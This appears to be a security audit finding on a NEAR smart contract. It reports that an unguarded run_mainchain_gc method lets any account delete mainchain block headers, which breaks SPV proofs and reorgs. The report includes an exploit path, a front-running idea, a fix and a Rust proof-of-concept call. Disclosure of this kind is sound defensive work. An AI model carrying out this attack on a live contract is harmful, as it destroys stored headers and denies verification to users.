### Title
`run_mainchain_gc()` Has No Caller Restriction, Allowing Any Unprivileged Account to Aggressively Prune Mainchain Headers and Break SPV Verification - (File: `contract/src/lib.rs`)

### Summary

`run_mainchain_gc()` is a public, state-mutating NEAR contract method guarded only by the `#[pause]` attribute. When the contract is not paused — its normal operating state — any unprivileged NEAR account can call it with an attacker-controlled `batch_size`. This allows an adversary to remove all mainchain block headers that exceed `gc_threshold` in a single transaction, permanently deleting them from `headers_pool` and both mainchain index maps. Downstream SPV verification calls targeting those blocks will fail, and chain reorgs whose fork point falls in the pruned range will panic with `PrevBlockNotFound`.

### Finding Description

The only guard on `run_mainchain_gc` is the `#[pause(except(roles(Role::UnrestrictedRunGC)))]` attribute:

```rust
#[pause(except(roles(Role::UnrestrictedRunGC)))]
pub fn run_mainchain_gc(&mut self, batch_size: u64) {
``` [1](#0-0) 

This attribute only blocks execution when the contract is paused. When the contract is running normally, the `#[pause]` macro imposes no caller check whatsoever — any NEAR account ID can invoke the function. There is no `#[trusted_relayer]`, no `acl_require`, and no `env::predecessor_account_id()` check.

Inside the function, `batch_size` is attacker-controlled and is used directly to compute how many blocks to delete:

```rust
let total_amount_to_remove = amount_of_headers_we_store - self.gc_threshold;
let selected_amount_to_remove = std::cmp::min(total_amount_to_remove, batch_size);
``` [2](#0-1) 

Passing `batch_size = u64::MAX` causes `selected_amount_to_remove` to equal `total_amount_to_remove`, removing every block beyond `gc_threshold` in one call. Each removed block is fully erased from all three storage structures via `remove_block_header`:

```rust
fn remove_block_header(&mut self, header_block_hash: &H256) {
    self.mainchain_header_to_height.remove(header_block_hash);
    self.headers_pool.remove(header_block_hash);
}
``` [3](#0-2) 

and from `mainchain_height_to_header`:

```rust
self.remove_block_header(blockhash);
self.mainchain_height_to_header.remove(&height);
``` [4](#0-3) 

The blocks are completely gone from on-chain storage after this call.

By contrast, `submit_blocks` — the only other mutable entry point — is correctly protected with `#[trusted_relayer]`, which enforces that the caller is a registered, active relayer:

```rust
#[payable]
#[pause]
#[trusted_relayer]
pub fn submit_blocks(
``` [5](#0-4) 

`run_mainchain_gc` has no equivalent protection.

**Exploit path:**

1. Attacker (any NEAR account, no role required) waits until the mainchain has grown beyond `gc_threshold` — a routine condition in production.
2. Attacker calls `run_mainchain_gc` with `batch_size = u64::MAX`.
3. All `total_amount_to_remove` blocks are deleted from `headers_pool`, `mainchain_height_to_header`, and `mainchain_header_to_height` in one transaction.
4. `mainchain_initial_blockhash` is advanced to the new oldest block.

### Impact Explanation

**SPV proof breakage.** `verify_transaction_inclusion` and `verify_transaction_inclusion_v2` both look up the target block in `mainchain_header_to_height` and `headers_pool`:

```rust
let target_block_height = self
    .mainchain_header_to_height
    .get(&args.tx_block_blockhash)
    .unwrap_or_else(|| env::panic_str("block does not belong to the current main chain"));
``` [6](#0-5) 

Any block removed by the attacker-triggered GC will cause these calls to panic. Downstream contracts or users relying on SPV proofs for blocks in the pruned range receive permanent verification failures.

**Chain reorg breakage.** The project's own documentation explicitly states: "If mainchain blocks near the fork point have been garbage collected, reorg will fail — the contract panics with `PrevBlockNotFound` when it cannot walk the chain back to the common ancestor." [7](#0-6) 

An attacker can trigger GC immediately before a legitimate fork submission, causing the reorg walk to panic and permanently preventing the honest chain from being promoted.

**Irreversibility.** Pruned blocks are fully deleted from `headers_pool`. Re-submitting them requires the relayer to re-submit every pruned block in order, since `get_prev_header` panics with `PrevBlockNotFound` if any ancestor is missing:

```rust
fn get_prev_header(&self, current_header: &LightHeader) -> ExtendedHeader {
    self.headers_pool
        .get(&current_header.prev_block_hash)
        .unwrap_or_else(|| env::panic_str("PrevBlockNotFound"))
}
``` [8](#0-7) 

Recovery is expensive and operationally complex.

### Likelihood Explanation

The precondition is trivially met: any NEAR account with enough NEAR for gas can call `run_mainchain_gc`. No role, no stake, no approval is required. The mainchain routinely grows beyond `gc_threshold` between relayer submissions, making the attack window continuously available in production. The attacker can also front-run a known pending SPV verification call by monitoring the NEAR mempool and submitting the GC call first.

### Recommendation

Add an explicit caller restriction to `run_mainchain_gc` mirroring the pattern used for `submit_blocks`. The simplest fix is to require the caller to hold the `UnrestrictedRunGC` role (or the relayer role) even when the contract is not paused:

```rust
#[pause(except(roles(Role::UnrestrictedRunGC)))]
pub fn run_mainchain_gc(&mut self, batch_size: u64) {
+   near_sdk::require!(
+       self.acl_has_role(Role::UnrestrictedRunGC, &env::predecessor_account_id())
+           || self.acl_has_role(Role::DAO, &env::predecessor_account_id()),
+       "Unauthorized: caller does not have permission to run GC"
+   );
    // ... rest of function
}
```

Alternatively, apply `#[trusted_relayer]` to this function so that only registered relayers (or bypass-role holders) can trigger GC, consistent with the access model already enforced on `submit_blocks`.

### Proof of Concept

```rust
// Any unprivileged NEAR account can call this on a live, non-paused contract.
// Precondition: mainchain has grown beyond gc_threshold (routine in production).

let attacker = sandbox.dev_create_account().await?; // no roles granted

// Verify the attacker has no special roles
// (no UnrestrictedRunGC, no DAO, no RelayerManager)

let size_before = contract.view("get_mainchain_size").args_json(json!({})).await?.json::<u64>()?;
println!("Mainchain size before attack: {size_before}");

// Attacker calls run_mainchain_gc with maximum batch_size
let outcome = attacker
    .call(contract.id(), "run_mainchain_gc")
    .args_json(json!({ "batch_size": u64::MAX }))
    .max_gas()
    .transact()
    .await?;

assert!(outcome.is_success(), "Expected attack to succeed: {:?}", outcome.failures());

let size_after = contract.view("get_mainchain_size").args_json(json!({})).await?.json::<u64>()?;
println!("Mainchain size after attack: {size_after}");
// size_after == gc_threshold; all excess blocks permanently deleted

// Now any verify_transaction_inclusion call targeting a pruned block will panic:
// "block does not belong to the current main chain"
```

### Citations

**File:** contract/src/lib.rs (L166-169)
```rust
    #[payable]
    #[pause]
    #[trusted_relayer]
    pub fn submit_blocks(
```

**File:** contract/src/lib.rs (L299-301)
```rust
            .mainchain_header_to_height
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("block does not belong to the current main chain"));
```

**File:** contract/src/lib.rs (L376-377)
```rust
    #[pause(except(roles(Role::UnrestrictedRunGC)))]
    pub fn run_mainchain_gc(&mut self, batch_size: u64) {
```

**File:** contract/src/lib.rs (L392-393)
```rust
            let total_amount_to_remove = amount_of_headers_we_store - self.gc_threshold;
            let selected_amount_to_remove = std::cmp::min(total_amount_to_remove, batch_size);
```

**File:** contract/src/lib.rs (L407-408)
```rust
                self.remove_block_header(blockhash);
                self.mainchain_height_to_header.remove(&height);
```

**File:** contract/src/lib.rs (L659-662)
```rust
    fn remove_block_header(&mut self, header_block_hash: &H256) {
        self.mainchain_header_to_height.remove(header_block_hash);
        self.headers_pool.remove(header_block_hash);
    }
```

**File:** contract/src/lib.rs (L671-674)
```rust
    fn get_prev_header(&self, current_header: &LightHeader) -> ExtendedHeader {
        self.headers_pool
            .get(&current_header.prev_block_hash)
            .unwrap_or_else(|| env::panic_str("PrevBlockNotFound"))
```

**File:** contract/CLAUDE.md (L60-60)
```markdown
**Caveat**: If mainchain blocks near the fork point have been garbage collected, reorg will fail — the contract panics with `PrevBlockNotFound` when it cannot walk the chain back to the common ancestor. This means GC depth must be set conservatively relative to expected fork lengths
```
